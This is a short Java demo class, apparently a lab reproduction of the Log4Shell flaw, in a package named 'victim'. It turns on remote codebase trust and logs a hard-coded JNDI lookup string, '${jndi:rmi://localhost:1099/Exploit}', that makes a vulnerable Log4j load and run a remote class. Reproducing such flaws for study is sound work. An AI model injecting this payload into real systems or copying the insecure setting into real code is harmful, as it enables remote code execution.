package cn.eovie.victim;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/**
 * Created by earayu on 2017/12/7.
 */
public class SomeFastjsonApp2 {
	  private static Logger log = LogManager.getLogger(SomeFastjsonApp2.class.getName());
    public static void main(String[] argv){
    	System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
    	 String userAgent="${jndi:rmi://localhost:1099/Exploit}";
         log.info("Request User Agent:" + userAgent);
    }


}
